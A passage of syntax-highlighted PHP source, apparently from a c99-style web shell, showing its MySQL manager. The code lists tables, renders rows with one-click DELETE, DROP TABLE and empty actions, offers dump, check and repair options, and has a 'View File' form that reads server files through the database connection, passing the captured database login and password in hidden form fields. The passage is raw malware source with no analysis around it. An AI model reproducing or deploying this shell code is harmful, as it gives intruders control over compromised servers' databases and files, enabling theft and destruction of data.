           <span class="k">foreach</span> <span class="p">(</span><span class="nv">$row</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span>
           <span class="p">{</span>
            <span class="nv">$v</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$v</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;font color=</span><span class="se">\&quot;</span><span class="s2">green</span><span class="se">\&quot;</span><span class="s2">&amp;gt;NULL&amp;lt;/font&amp;gt;&quot;</span><span class="p">;}</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$v</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
            <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
           <span class="p">}</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_act=query&amp;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_ls=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_le=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&amp;sql_query=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;DELETE FROM `&quot;</span><span class="o">.</span><span class="nv">$sql_tbl</span><span class="o">.</span><span class="s2">&quot;` WHERE&quot;</span><span class="o">.</span><span class="nv">$w</span><span class="o">.</span><span class="s2">&quot; LIMIT 1;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sql_button_drop</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Delete</span><span class="se">\&quot;</span><span class="s2"> height=</span><span class="se">\&quot;</span><span class="s2">13</span><span class="se">\&quot;</span><span class="s2"> width=</span><span class="se">\&quot;</span><span class="s2">11</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&amp;nbsp;&quot;</span><span class="p">;</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl_act=insert&amp;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_ls=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_ls</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_le=&quot;</span><span class="o">.</span><span class="nv">$sql_tbl_le</span><span class="o">.</span><span class="s2">&quot;&amp;sql_tbl_insert_q=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$w</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=change</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Edit</span><span class="se">\&quot;</span><span class="s2"> height=</span><span class="se">\&quot;</span><span class="s2">14</span><span class="se">\&quot;</span><span class="s2"> width=</span><span class="se">\&quot;</span><span class="s2">14</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&amp;nbsp;&quot;</span><span class="p">;</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&amp;lt;p align=</span><span class="se">\&quot;</span><span class="s2">left</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=arrow_ltr</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;select name=</span><span class="se">\&quot;</span><span class="s2">sql_act</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt;With selected:&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">deleterow</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Delete&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/select&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Confirm</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/p&amp;gt;&quot;</span><span class="p">;</span>
         <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
         <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SHOW TABLE STATUS&quot;</span><span class="p">,</span> <span class="nv">$sql_sock</span><span class="p">);</span>
         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nx">mysql_smarterror</span><span class="p">();}</span>
         <span class="k">else</span>
         <span class="p">{</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;form method=</span><span class="se">\&quot;</span><span class="s2">POST</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=</span><span class="se">\&quot;</span><span class="s2">100%</span><span class="se">\&quot;</span><span class="s2"> bgcolor=#000000 borderColorLight=#c0c0c0 border=1&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">boxtbl_all</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;Table&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Rows&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Type&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Created&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Modified&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Size&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;Action&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
          <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
          <span class="nv">$tsize</span> <span class="o">=</span> <span class="nv">$trows</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
          <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQL_ASSOC</span><span class="p">))</span>
          <span class="p">{</span>
           <span class="nv">$tsize</span> <span class="o">+=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Data_length&quot;</span><span class="p">];</span>
           <span class="nv">$trows</span> <span class="o">+=</span> <span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Rows&quot;</span><span class="p">];</span>
           <span class="nv">$size</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Data_length&quot;</span><span class="p">]);</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">boxtbl[]</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;nbsp;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Rows&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Type&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Create_time&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Update_time&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$size</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_act=query&amp;sql_query=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;DELETE FROM `&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sql_button_empty</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Empty</span><span class="se">\&quot;</span><span class="s2"> height=</span><span class="se">\&quot;</span><span class="s2">13</span><span class="se">\&quot;</span><span class="s2"> width=</span><span class="se">\&quot;</span><span class="s2">11</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&amp;nbsp;&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_act=query&amp;sql_query=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="s2">&quot;DROP TABLE `&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sql_button_drop</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Drop</span><span class="se">\&quot;</span><span class="s2"> height=</span><span class="se">\&quot;</span><span class="s2">13</span><span class="se">\&quot;</span><span class="s2"> width=</span><span class="se">\&quot;</span><span class="s2">11</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&amp;nbsp;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_surl</span><span class="o">.</span><span class="s2">&quot;sql_tbl_act=insert&amp;sql_tbl=&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s2">&quot;Name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sql_button_insert</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">Insert</span><span class="se">\&quot;</span><span class="s2"> height=</span><span class="se">\&quot;</span><span class="s2">13</span><span class="se">\&quot;</span><span class="s2"> width=</span><span class="se">\&quot;</span><span class="s2">11</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/a&amp;gt;&amp;nbsp;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
           <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
           <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr bgcolor=</span><span class="se">\&quot;</span><span class="s2">000000</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;+&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;center&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s2">&quot; table(s)&amp;lt;/b&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$trows</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nx">view_size</span><span class="p">(</span><span class="nv">$tsize</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&amp;lt;p align=</span><span class="se">\&quot;</span><span class="s2">right</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=arrow_ltr</span><span class="se">\&quot;</span><span class="s2"> border=</span><span class="se">\&quot;</span><span class="s2">0</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;select name=</span><span class="se">\&quot;</span><span class="s2">sql_act</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;\&quot;</span><span class="s2">&amp;gt;With selected:&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">tbldrop</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Drop&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">tblempty</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Empty&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">tbldump</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Dump&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">tblcheck</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Check table&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">tbloptimize</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Optimize table&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">tblrepair</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Repair table&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=</span><span class="se">\&quot;</span><span class="s2">tblanalyze</span><span class="se">\&quot;</span><span class="s2">&amp;gt;Analyze table&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
          <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/select&amp;gt;&amp;nbsp;&amp;lt;input type=</span><span class="se">\&quot;</span><span class="s2">submit</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">Confirm</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/p&amp;gt;&quot;</span><span class="p">;</span>
          <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
         <span class="p">}</span>
        <span class="p">}</span>
       <span class="p">}</span>
       <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
       <span class="nv">$acts</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;newdb&quot;</span><span class="p">,</span><span class="s2">&quot;serverstatus&quot;</span><span class="p">,</span><span class="s2">&quot;servervars&quot;</span><span class="p">,</span><span class="s2">&quot;processes&quot;</span><span class="p">,</span><span class="s2">&quot;getfile&quot;</span><span class="p">);</span>
       <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">,</span><span class="nv">$acts</span><span class="p">))</span> <span class="p">{</span><span class="cp">?&gt;</span><span class="x">&amp;lt;table border=&quot;0&quot; width=&quot;100%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;b&amp;gt;Create new DB:&amp;lt;/b&amp;gt;&amp;lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;newdb&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;sql_newdb&quot; size=&quot;20&quot;&amp;gt;&amp;nbsp;&amp;lt;input type=&quot;submit&quot; value=&quot;Create&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;b&amp;gt;View File:&amp;lt;/b&amp;gt;&amp;lt;form action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;sql&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_act&quot; value=&quot;getfile&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_login&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_login</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_passwd&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_passwd</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_server&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_server</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;hidden&quot; name=&quot;sql_port&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_port</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;lt;input type=&quot;text&quot; name=&quot;sql_getfile&quot; size=&quot;30&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_getfile</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&amp;gt;&amp;nbsp;&amp;lt;input type=&quot;submit&quot; value=&quot;Get&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;30%&quot; height=&quot;1&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;</span><span class="cp">&lt;?php</span> <span class="p">}</span>
       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&amp;gt;&quot;</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_act</span> <span class="o">==</span> <span class="s2">&quot;newdb&quot;</span><span class="p">)</span> <span class="p">{</span>
         <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;&quot;</span><span class="p">;</span>
